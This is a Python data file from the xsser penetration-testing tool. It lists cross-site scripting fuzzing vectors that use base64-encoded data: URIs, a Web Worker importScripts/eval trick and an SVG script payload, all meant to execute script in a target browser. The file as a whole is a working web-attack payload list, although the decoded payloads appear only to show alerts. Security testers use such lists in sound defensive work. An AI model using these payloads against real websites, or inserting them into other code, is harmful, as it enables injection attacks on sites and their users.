#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
$Id$

This file is part of the xsser project, http://xsser.03c8.net

Copyright (c) 2011/2016 psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
## This file contains different XSS fuzzing vectors.
## If you have some new, please email me to [epsylon@riseup.net]
## Happy Cross Hacking! ;)

DCPvectors = [
		{ 'payload' : """<a href="data:text/html;base64,JTNjc2NyaXB0JTNlYWxlcnQoIlhTUyIpO2hpc3RvcnkuYmFjaygpOyUzYy9zY3JpcHQlM2UiPjwv YT4=""",
                  'browser' : """[Data Control Protocol Injection]""" },

		{ 'payload' : """<iframe src="data:text/html;base64,JTNjc2NyaXB0JTNlYWxlcnQoIlhTUyIpO2hpc3RvcnkuYmFjaygpOyUzYy9zY3JpcHQlM2UiPjwv""",
		  'browser' : """[Data Control Protocol Injection]"""},	
	
		#{ 'payload' : """data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7aGlzdG9yeS5iYWNrKCk7PC9zY3JpcHQ+""",
                #  'browser' : """[Data Control Protocol Injection]"""},

		#{ 'payload' : """data:text/html;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KCJYU1MiKStBRHMtaGlzdG9yeS5iYWNrKCkrQURzQVBBLS9z-""",
		#  'browser' : """[Data Control Protocol Injection]""" },

		#{ 'payload' : """data:text/html;base64,LCtBRHdBY3dCakFISUFhUUJ3QUhRQVBnKy1hbGVydCgiWFNTIik7aGlzdG9yeS5iYWNrKCkrQURz""",
                #  'browser' : """[Data Control Protocol Injection]""" },

		#{ 'payload' : """data:text/html;base64,K0FEd0Fjd0JqQUhJQWFRQndBSFFBUGdCaEFHd0FaUUJ5QUhRQUtBQXhBQ2tBT3dCb0FHa0Fjd0Iw""",
                #  'browser' : """[Data Control Protocol Injection]""" },

		#{ 'payload' : """data:text/html;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KFhTUykrQURzLWhpc3RvcnkuYmFjaygpK0FEc0FQQS0vc2Ny aXB0K0FENC0=""",
                #  'browser' : """[Data Control Protocol Injection]""" },

		{ 'payload' : """0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7aGlzdG9yeS5iYWNrKCk7PC9zY3JpcHQ+'))""",
		  'browser' : """[Data Control Protocol Injection]"""},

		{ 'payload' : """data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==""",
                  'browser' : """[Data Control Protocol Injection]""" }
		]
